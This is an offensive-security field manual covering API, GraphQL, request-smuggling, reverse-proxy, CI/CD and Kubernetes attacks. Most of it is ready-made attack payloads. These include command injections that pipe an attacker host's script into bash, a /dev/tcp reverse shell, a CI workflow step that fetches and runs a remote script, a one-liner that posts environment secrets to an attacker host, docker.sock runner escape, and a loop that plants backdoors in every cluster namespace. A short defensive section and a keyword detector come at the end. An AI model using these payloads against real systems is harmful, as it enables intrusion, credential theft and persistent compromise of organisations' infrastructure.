# Offensive Security RCE Field Manual — Part 6  
## API Abuse, GraphQL RCE, Proxy Obfuscation, CI/CD Reverse Chains & Post-Exploitation Automation (2025 Edition)  
*A comprehensive offensive guide covering API manipulation, GraphQL exploitation, reverse proxy obfuscation, CI/CD chained pivots, cloud-native API abuse, and automated post-exploitation frameworks used by modern adversaries in 2025.*

---

# LEGAL DISCLAIMER
This document is for **authorized offensive testing, red teaming, cyber defense training, and research only**.  
Do not use these techniques without explicit written permission. Unauthorized testing is illegal.

---

# Table of Contents

1. [Introduction](#introduction)  
2. [API Abuse & API-Based RCE](#api-abuse--api-based-rce)  
   - 2.1 Abusing API Weak Schemas  
   - 2.2 API Parameter Pollution  
   - 2.3 Hidden/Shadow API Discovery  
   - 2.4 API Desync Attacks  
3. [GraphQL Exploitation](#graphql-exploitation)  
   - 3.1 GraphQL Introspection Abuse  
   - 3.2 Nested Resolver RCE  
   - 3.3 Template Injection in GraphQL  
   - 3.4 GraphQL Batch Smuggling  
4. [Reverse Proxy Obfuscation (WPO)](#reverse-proxy-obfuscation-wpo)  
   - 4.1 Proxy/Balancer Parsing Gaps  
   - 4.2 Host Header Injection  
   - 4.3 Path Rewriting Abuse  
   - 4.4 HTTP Method Tunneling  
5. [CI/CD Reverse Chains (2025 Attack Patterns)](#cicd-reverse-chains-2025-attack-patterns)  
   - 5.1 GitHub Actions → Cloud → K8s  
   - 5.2 GitLab CI → Runner Escape  
   - 5.3 Build Artifact Poisoning  
   - 5.4 Environment Secret Exfiltration  
6. [Post-Exploitation Automation](#post-exploitation-automation)  
   - 6.1 Automated Cloud Enumeration  
   - 6.2 Auto-RCE Deployment in Multi-Cluster Environments  
   - 6.3 Event-Driven Persistence  
   - 6.4 Auto-Propagation Implants  
7. [Real-World Case Studies (2025)](#real-world-case-studies-2025)  
8. [Defensive Countermeasures](#defensive-countermeasures)  
9. [Legal Notice](#legal-notice)

---

# Introduction

Modern RCE attacks rarely end at initial code execution.  
In 2025, attackers leverage APIs, CI/CD systems, and reverse proxies to transform a single foothold into a **distributed execution network** across:

- cloud resources  
- serverless functions  
- container clusters  
- CI/CD pipelines  
- customer-facing APIs  
- internal microservices  

This module covers **how attackers weaponize post-RCE access** using API abuse, proxy confusion, GraphQL injection, and automated lateral movement.

---

# API Abuse & API-Based RCE

Today’s applications expose tens or hundreds of APIs.  
Many are undocumented or lightly protected.

---

# 2.1 Abusing API Weak Schemas

API schemas often fail to enforce:

- strict types  
- allowed values  
- required fields  
- field depth  
- field recursion limits  

Attackers inject RCE payloads into any field evaluated dynamically.

### Example: JSON property RCE

```json
{
  "user": "admin",
  "email": "test@example.com\"});require('child_process').exec('curl attacker|bash');//",
  "role": "user"
}
```

---

# 2.2 API Parameter Pollution

API endpoints often trust the last or first parameter.

```
/api/run?cmd=id&cmd=curl attacker | bash
```

Backend executes second value  
WAF inspects the first.

---

# 2.3 Hidden/Shadow API Discovery

Tools used:

```bash
# HTTPX
httpx -l urls.txt -sc -td -server -path /api/

# Kiterunner
kr scan HOST -A routes-large.kite

# Burp Suite Param Miner extension
```

Shadow APIs frequently run older vulnerable logic.

---

# 2.4 API Desync Attacks (HTTP Request Smuggling)

### TE.CL and CL.TE smuggling

Attackers bypass WAFs using inconsistent:

- Content-Length  
- Transfer-Encoding  

Example payload:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 58
Transfer-Encoding: chunked

0

POST /admin/run HTTP/1.1
Content-Length: 19

cmd=curl attacker|sh
```

Backend executes second request; WAF ignores it.

---

# GraphQL Exploitation

GraphQL is now a major RCE vector.

---

# 3.1 GraphQL Introspection Abuse

Dump schema:

```graphql
query {
  __schema {
    types {
      name
      fields { name }
    }
  }
}
```

This reveals:

- hidden queries  
- dangerous mutations  
- resolver relationships

---

# 3.2 Nested Resolver RCE

Resolvers concatenate input into dynamic operations.

Example exploitation:

```graphql
mutation {
  runCommand(input: "id; curl attacker|bash") {
    result
  }
}
```

---

# 3.3 Template Injection in GraphQL

GraphQL often proxies input into template engines.

```graphql
query {
  user(id: "{{7*7}}") { name }
}
```

Or worse:

```graphql
query {
  exec(input: "${T(java.lang.Runtime).getRuntime().exec('curl attacker|sh')}")
}
```

---

# 3.4 GraphQL Batch Smuggling

WAF may inspect only first request in batch:

```json
[
  {"query": "query{user(id:1){name}}"},
  {"query": "mutation{run(cmd:\"curl attacker|sh\")}"},
  {"query": "mutation{exec(cmd:\"bash -i >&/dev/tcp/10.0.0.5/4444 0>&1\")}"}
]
```

Backend executes all requests.

---

# Reverse Proxy Obfuscation (WPO)

Reverse proxies like:

- NGINX  
- Envoy  
- Traefik  
- HAProxy  
- Cloudflare Workers  
- AWS API Gateway  

often parse requests differently than WAFs or apps.

---

# 4.1 Proxy/Balancer Parsing Gaps

### Encoded path trick

```
/adm%69n
```

Backend → `/admin`  
WAF → sees harmless `/adm%69n`

---

# 4.2 Host Header Injection

Classic API gateway bypass:

```http
GET / HTTP/1.1
Host: internal.service.cluster.local
```

---

# 4.3 Path Rewriting Abuse

Example:

```
/api/../admin/run?cmd=curl attacker|bash
```

WAF blocks `/admin`, but not path traversal.

---

# 4.4 HTTP Method Tunneling

Some proxies respect:

```
X-HTTP-Method-Override: PUT
```

Or JSON content determines method:

```json
{"method":"DELETE","path":"/admin"}
```

---

# CI/CD Reverse Chains (2025 Attack Patterns)

CI/CD RCE is one of the most devastating modern attacks.

---

# 5.1 GitHub Actions → Cloud → K8s

Attack chain:

1. Compromise Actions workflow → arbitrary code  
2. Exfiltrate cloud IAM keys  
3. Deploy malicious pod to Kubernetes  
4. Persist via DaemonSet  

Payload:

```yaml
run: curl -s https://attacker.com/gtfo.sh | bash
```

---

# 5.2 GitLab CI → Runner Escape

GitLab runners often mount docker.sock → host RCE:

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
```

---

# 5.3 Build Artifact Poisoning

Inject malicious script inside builds:

```bash
echo "curl attacker | sh" >> build.sh
```

---

# 5.4 Environment Secret Exfiltration

Common attacker method:

```bash
env | base64 | curl -X POST https://attacker/ --data-binary @-
```

---

# Post-Exploitation Automation

Attackers automate discovery, lateral movement, and persistence.

---

# 6.1 Automated Cloud Enumeration

Python example:

```python
import boto3
for s in boto3.Session().get_available_services():
    print("Checking service:", s)
```

---

# 6.2 Auto-RCE Deployment in Multi-Cluster Environments

Attackers deploy privileged pods cluster-wide:

```bash
kubectl apply -f malicious-daemonset.yaml
```

---

# 6.3 Event-Driven Persistence

Lambda / Cloud Functions triggered by:

- S3 file upload  
- CloudWatch Events  
- Pub/Sub messages  
- Azure Event Grid  

Attacker persists invisibly.

---

# 6.4 Auto-Propagation Implants

Bot that infects every namespace:

```bash
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  kubectl apply -f backdoor.yaml -n $ns
done
```

---

# Real-World Case Studies (2025)

---

## Case Study #1 — GraphRCE (Global SaaS Breach)

- Entry: GraphQL introspection  
- Pivot: batch request smuggling  
- Execution: resolver concatenation RCE  
- Impact: full customer data theft  

---

## Case Study #2 — ShadowAPI Incident (E-Commerce Sector)

- Internal unlisted API did dynamic eval()  
- Attackers found it via Kiterunner  
- RCE → CI/CD → K8s → Cloud IAM takeover  

---

## Case Study #3 — DesyncRCE Attack

- HTTP desync bypassed Cloudflare WAF  
- Smuggled RCE payload to backend  
- Backend executed OS commands  
- Attacker deployed crypto-miners cluster-wide  

---

# Defensive Countermeasures

### API Security

- Strict JSON schema validation  
- Field allowlisting  
- Disable introspection in production  
- Maximum depth/recursion limits  
- Reject unknown fields  

### CI/CD Hardening

- Remove docker.sock  
- Rotate all secrets after CI compromise  
- Require signed workflows  

### Proxy Security

- Normalize all paths  
- Block encoded admin paths  
- Enforce same behavior across WAF/proxy/backend  

### Detection Example: RCE in API

```python
if "curl " in body or "wget " in body or "|bash" in body:
    alert("Possible RCE payload detected")
```

---

# Legal Notice

This material is intended solely for cybersecurity professionals conducting **authorized** offensive operations or defensive research. Misuse of these techniques is illegal.  
Always obtain explicit written permission.

---

# END OF PART 6
